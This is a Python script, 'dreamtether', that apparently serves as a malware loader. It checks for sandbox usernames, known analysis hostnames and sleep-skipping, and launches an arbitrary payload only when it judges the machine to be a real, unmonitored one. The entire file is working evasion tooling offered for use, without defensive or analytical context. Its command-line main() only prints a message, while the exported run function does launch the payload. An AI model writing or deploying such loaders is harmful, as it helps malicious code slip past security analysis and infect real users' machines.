"""
dreamtether.py — Sandbox-Aware Payload Tether
Executes payloads only when conditions are clean.
"""

import os
import platform
import getpass
import time
import subprocess

def dreamtether_main(*args):
    if not args:
        return "[dreamtether] Usage: dreamtether <payload_path>"

    payload = args[0]
    output = [banner()]
    output.append("[*] Performing environment checks...")

    if is_sandboxed():
        output.append("[!] Sandbox traits detected. Aborting payload execution.")
    else:
        output.append("[+] Clean environment detected. Launching payload.")
        output.append(run_payload(payload))

    return "\n".join(output)


def banner():
    return r"""
╔══════════════════════════════════════╗
║ dreamtether — sandbox-aware loader  ║
╠══════════════════════════════════════╣
║  Executes only under clean signal   ║
╚══════════════════════════════════════╝
"""


def is_sandboxed():
    flags = []

    # Suspicious usernames
    if getpass.getuser().lower() in ['sandbox', 'virus', 'malware', 'analyst', 'test']:
        flags.append("low-entropy username")

    # Suspicious hostnames
    if platform.node().lower() in ['winvm', 'testpc', 'malbox', 'vmware']:
        flags.append("known sandbox hostname")

    # Time check (sandbox fast-forward trick)
    start = time.time()
    time.sleep(2)
    delta = time.time() - start
    if delta < 1.5:
        flags.append("timing anomaly (sleep skip)")

    return bool(flags)


def run_payload(path):
    try:
        if path.endswith(".py"):
            subprocess.Popen(["python3", path])
        else:
            subprocess.Popen([path])
        return f"[+] Payload launched: {path}"
    except Exception as e:
        return f"[!] Payload launch failed: {e}"


run = dreamtether_main

def main(args=None):
    if not args or len(args) < 1:
        print("[dreamtether] Usage: dreamtether <payload_path>")
        return
    payload_path = args[0]
    print(f"[dreamtether] Tethering payload from: {payload_path}")

if __name__ == "__main__":
    import sys
    main(sys.argv[1:])
